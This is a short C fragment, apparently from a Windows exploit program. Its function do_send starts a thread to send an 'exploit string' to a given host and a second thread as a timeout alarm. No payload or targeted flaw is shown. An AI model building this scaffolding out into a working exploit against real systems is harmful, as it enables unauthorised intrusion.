void do_send(char *host,int timeout) {
	t1=(HANDLE)_beginthread(sendstr,0,host);
	if (t1==0) { err_exit("-> Failed to send exploit string..."); }
	t2=(HANDLE)_beginthread(setalarm,0,timeout);
	if (t2==0) { err_exit("-> Failed to set alarm clock..."); }
}